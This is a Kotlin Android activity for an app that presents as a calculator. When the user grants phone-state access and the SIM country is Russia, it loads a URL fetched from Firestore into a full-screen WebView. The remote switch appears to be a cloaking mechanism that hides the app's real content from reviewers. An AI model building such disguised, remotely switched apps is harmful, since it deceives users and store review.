package com.testfirebaseapp

import android.Manifest.permission
import android.content.DialogInterface
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.view.View
import android.webkit.ValueCallback
import android.webkit.WebChromeClient
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.ViewModelProvider
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.FirebaseFirestoreSettings
import com.testfirebaseapp.calculator.MainRepository
import com.testfirebaseapp.calculator.ViewModelMain
import com.testfirebaseapp.siminfo.acces_to_sim
import kotlinx.android.synthetic.main.activity_main.*


class MainActivity : AppCompatActivity() {
    private lateinit var viewModelMain: ViewModelMain
    private val REQUEST_ID_MULTIPLE_PERMISSIONS = 1

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        FirebaseFirestore.getInstance().clearPersistence()

        if (checkAndRequestPermissions()) checkPermission()

    }


    private fun openWebView(url: String) {
        val i = Intent(this, WebViewActivity::class.java)
        i.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        i.flags = Intent.FLAG_ACTIVITY_NO_ANIMATION
        i.putExtra("url", url)
        startActivity(i)
        finish()


    }

    private fun loadNative() {
        calculator_layout.visibility = View.VISIBLE
        val factory: ViewModelMain.Factory = ViewModelMain.Factory(MainRepository.getInstance())
        viewModelMain = ViewModelProvider(this, factory).get(ViewModelMain::class.java)

        viewModelMain.click(this, calculator_layout)

    }

    fun toast(mess: String) {
        Toast.makeText(this, mess, Toast.LENGTH_SHORT).show()
    }

    private fun simCardInfo(): Boolean {
        val list = acces_to_sim(this)
        return !list[0].equals("") && list[1].equals("ru")

    }

    private fun dataFromFireBase() {
        val db = FirebaseFirestore.getInstance()

        val settings = FirebaseFirestoreSettings.Builder()
            .setPersistenceEnabled(false)
            .build()
        db.firestoreSettings = settings
        var isLoaded = false

        db.collection("data")
            .get()
            .addOnCompleteListener { task ->
                if (task.isSuccessful) {
                    for (document in task.result!!) {
//                        toast("Data from Firestore: " + document.data["value"])
                        isLoaded = true
                        if (document.data["value"].toString().isEmpty()) loadNative()
                        else
                            openWebView("" + document.data["value"])
                    }
                } else if (task.isCanceled) loadNative()
                if (!isLoaded) loadNative()
            }

    }


    private fun checkPermission() {
        if (simCardInfo()) {
            dataFromFireBase()
        } else {
            loadNative()
        }
    }

    private fun checkAndRequestPermissions(): Boolean {
        val permissionLocation =
            ContextCompat.checkSelfPermission(this, permission.READ_PHONE_STATE)
        val listPermissionsNeeded = ArrayList<String>()

        if (permissionLocation != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(permission.READ_PHONE_STATE)
        }
        if (listPermissionsNeeded.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                listPermissionsNeeded.toTypedArray(),
                REQUEST_ID_MULTIPLE_PERMISSIONS
            )
            return false
        }
        return true
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>, grantResults: IntArray
    ) {
        when (requestCode) {
            REQUEST_ID_MULTIPLE_PERMISSIONS -> {

                val perms = HashMap<String, Int>()
                perms[permission.READ_PHONE_STATE] = PackageManager.PERMISSION_GRANTED
                if (grantResults.isNotEmpty()) {
                    for (i in permissions.indices)
                        perms[permissions[i]] = grantResults[i]
                    if (perms[permission.READ_PHONE_STATE] == PackageManager.PERMISSION_GRANTED) {
                        checkPermission()
                    } else {
                        if (ActivityCompat.shouldShowRequestPermissionRationale(
                                this,
                                permission.READ_PHONE_STATE
                            )
                        ) {
                            showDialogOK(getString(R.string.per_msg),
                                DialogInterface.OnClickListener { _, which ->
                                    when (which) {
                                        DialogInterface.BUTTON_POSITIVE -> checkAndRequestPermissions()
                                        DialogInterface.BUTTON_NEGATIVE ->
                                            loadNative()
                                    }
                                })
                        } else {

                            explain(getString(R.string.explain_msg))
                        }
                    }
                }
            }
        }

    }

    private fun showDialogOK(message: String, okListener: DialogInterface.OnClickListener) {
        AlertDialog.Builder(this)
            .setMessage(message)
            .setPositiveButton("OK", okListener)
            .setNegativeButton("Cancel", okListener)
            .create()
            .show()
    }

    private fun explain(msg: String) {
        val dialog = AlertDialog.Builder(this)
        dialog.setMessage(msg)
            .setPositiveButton("Yes") { _, _ ->
                startActivity(
                    Intent(
                        android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS
                    )
                )
            }
            .setNegativeButton("Cancel") { _, _ -> finish() }
        dialog.show()
    }


    //image from webview



}
